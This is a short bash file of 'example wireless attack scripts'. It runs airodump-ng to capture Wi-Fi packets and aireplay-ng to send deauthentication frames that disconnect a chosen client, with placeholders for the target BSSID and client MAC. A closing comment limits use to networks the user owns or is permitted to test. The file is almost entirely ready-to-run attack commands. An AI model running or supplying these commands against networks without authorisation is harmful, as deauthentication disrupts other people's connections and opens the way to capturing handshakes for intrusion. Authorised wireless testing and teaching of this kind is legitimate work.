#!/bin/bash
# Example Wireless Attack Scripts

# Example 1: Start airodump-ng to capture packets
sudo airodump-ng wlan0

# Example 2: Deauthenticating a client from the network
sudo aireplay-ng --deauth 10 -a [BSSID] -c [CLIENT_MAC] wlan0

# Remember to replace [BSSID] and [CLIENT_MAC] with the actual MAC addresses.
# Use these scripts responsibly and only on networks you own or have permission to test.